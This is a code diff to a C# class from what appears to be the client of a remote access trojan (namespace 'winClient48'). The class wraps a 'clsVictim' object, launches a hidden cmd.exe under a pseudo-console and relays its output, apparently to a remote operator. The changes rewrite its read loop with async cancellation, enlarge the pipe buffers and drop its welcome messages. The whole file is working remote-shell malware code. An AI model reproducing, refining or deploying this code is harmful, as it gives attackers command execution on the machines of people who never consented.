@@ -2,6 +2,7 @@
 using System;
 using System.Collections.Generic;
 using System.ComponentModel;
+using System.IO;
 using System.Linq;
 using System.Runtime.InteropServices;
 using System.Text;
@@ -36,6 +37,8 @@ namespace winClient48
         private readonly clsVictim m_victim;
         private readonly string m_szInitDir;
 
+        private CancellationTokenSource _cts;
+
         public clsfnXterm(clsVictim victim, string szInitDir)
         {
             m_victim = victim;
@@ -62,8 +65,8 @@ namespace winClient48
         {
             fnStop();
 
-            WinAPI.CreatePipe(out m_hPipeInRead, out m_hPipeInWrite, IntPtr.Zero, 0);
-            WinAPI.CreatePipe(out m_hPipeOutRead, out m_hPipeOutWrite, IntPtr.Zero, 0);
+            WinAPI.CreatePipe(out m_hPipeInRead, out m_hPipeInWrite, IntPtr.Zero, 65536);
+            WinAPI.CreatePipe(out m_hPipeOutRead, out m_hPipeOutWrite, IntPtr.Zero, 65536);
 
             var size = new WinAPI.COORD
             {
@@ -85,14 +88,10 @@ namespace winClient48
             fnStartProcessWithConPTY("cmd.exe /Q /K");
 
             m_isRunning = true;
-            m_readThread = new Thread(fnReadLoop)
-            {
-                IsBackground = true
-            };
+            _cts = new CancellationTokenSource();
+            m_readThread = new Thread(() => fnReadLoop(_cts.Token).Wait());
+            m_readThread.IsBackground = true;
             m_readThread.Start();
-
-            fnPushInput("echo Welcome to Xterm Shell\r\n");
-            fnPushInput("echo READY\r\n");
         }
 
         /// <summary>
@@ -100,6 +99,9 @@ namespace winClient48
         /// </summary>
         public void fnStop()
         {
+            _cts?.Cancel();
+            m_readThread?.Join(1000);
+
             m_isRunning = false;
 
             m_hPipeOutRead?.Dispose();
@@ -188,26 +190,34 @@ namespace winClient48
         /// <summary>
         /// Read loop.
         /// </summary>
-        private void fnReadLoop()
+        private async Task fnReadLoop(CancellationToken token)
         {
-            var buffer = new byte[4096];
-
-            while (m_isRunning)
+            using (var fs = new FileStream(m_hPipeOutRead, FileAccess.Read, 4096, false))
             {
-                if (!WinAPI.ReadFile(
-                    m_hPipeOutRead,
-                    buffer,
-                    buffer.Length,
-                    out int read,
-                    IntPtr.Zero
-                ))
-                    break;
-
-                if (read > 0)
+                var abBuffer = new byte[4096];
+                while (!token.IsCancellationRequested)
                 {
-                    var data = new byte[read];
-                    Buffer.BlockCopy(buffer, 0, data, 0, read);
-                    actOnOutput?.Invoke(data);
+                    int nRead = 0;
+                    try
+                    {
+                        nRead = await fs.ReadAsync(abBuffer, 0, abBuffer.Length, token);
+                    }
+                    catch (OperationCanceledException)
+                    {
+                        break;
+                    }
+                    catch
+                    {
+                        break;
+                    }
+
+                    if (nRead == 0)
+                        break;
+
+                    var abData = new byte[nRead];
+                    Buffer.BlockCopy(abBuffer, 0, abData, 0, nRead);
+
+                    actOnOutput?.Invoke(abData);
                 }
             }
         }
@@ -216,7 +226,14 @@ namespace winClient48
         /// Input
         /// </summary>
         /// <param name="szInput"></param>
-        public void fnPushInput(string szInput) => fnPushInput(Encoding.UTF8.GetBytes(szInput));
+        public void fnPushInput(string szInput)
+        {
+            if (!m_isRunning || m_hPipeInWrite == null)
+                return;
+
+            var abData = Encoding.UTF8.GetBytes(szInput);
+            WinAPI.WriteFile(m_hPipeInWrite, abData, abData.Length, out _, IntPtr.Zero);
+        }
 
         /// <summary>
         /// Input
@@ -227,8 +244,10 @@ namespace winClient48
             if (!m_isRunning || m_hPipeInWrite == null)
                 return;
 
+            /*
             if (abData.Length == 1 && abData[0] == (byte)'\n')
                 abData = Encoding.ASCII.GetBytes("\r\n");
+            */
 
             WinAPI.WriteFile(m_hPipeInWrite, abData, abData.Length, out _, IntPtr.Zero);
         }
